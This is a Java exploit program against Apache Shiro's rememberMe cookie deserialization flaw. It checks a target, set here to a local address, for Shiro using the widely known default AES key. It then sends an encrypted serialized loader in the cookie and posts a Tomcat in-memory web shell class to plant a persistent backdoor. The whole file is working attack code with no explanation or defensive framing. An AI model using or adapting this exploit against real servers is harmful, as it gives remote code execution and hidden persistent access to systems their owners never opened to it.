package org.sec;

import okhttp3.*;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;

import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Paths;


public class Exp {

    public static void main(String[] args) {
        try {
            SimplePrincipalCollection sc = new SimplePrincipalCollection();
            byte[] scBytes = Payload.serialize(sc);
            byte[] keyBytes = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");

            CipherService cipherService = new AesCipherService();
            ByteSource byteSource = cipherService.encrypt(scBytes, keyBytes);
            byte[] value = byteSource.getBytes();
            String checkKeyCookie = "rememberMe=" + Base64.encodeToString(value);

            OkHttpClient client = new OkHttpClient();
            String indexUrl = "http://127.0.0.1:8080/";
            Request loginReq = new Request.Builder()
                    .url(indexUrl)
                    .addHeader("Cookie", "rememberMe=4ra1n")
                    .get()
                    .build();

            Call call = client.newCall(loginReq);
            Response response = call.execute();
            String respCookie = response.header("Set-Cookie");

            boolean shiro = false;
            if (respCookie != null && !respCookie.equals("")) {
                if (respCookie.contains("rememberMe=deleteMe")) {
                    Request checkReq = new Request.Builder()
                            .url(indexUrl)
                            .addHeader("Cookie", checkKeyCookie)
                            .get()
                            .build();
                    Call checkCall = client.newCall(checkReq);
                    Response checkResponse = checkCall.execute();
                    if (checkResponse.header("Set-Cookie") == null) {
                        shiro = true;
                        System.out.println("find shiro");
                    }
                }
            }

            if (!shiro) {
                return;
            }

            URI uri = Exp.class.getResource("TomcatMemShellInject.class").toURI();
            byte[] memShellBytes = Files.readAllBytes(Paths.get(uri));
            String memShellCode = Base64.encodeToString(memShellBytes);

            RequestBody body = new FormBody.Builder()
                    .add("classData", memShellCode).build();

            Object loaderObj = Payload.getPayload("TomcatMemLoader");
            byte[] loaderBytes = Payload.serialize(loaderObj);
            ByteSource loaderSource = cipherService.encrypt(loaderBytes, keyBytes);
            byte[] loaderValue = loaderSource.getBytes();
            String loaderCookie = "rememberMe=" + Base64.encodeToString(loaderValue);
            System.out.println("payload length: " + loaderCookie.length());
            Request loaderReq = new Request.Builder()
                    .url(indexUrl + "/demo")
                    .addHeader("Cookie", loaderCookie)
                    .post(body)
                    .build();
            Call loaderCall = client.newCall(loaderReq);
            loaderCall.execute();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
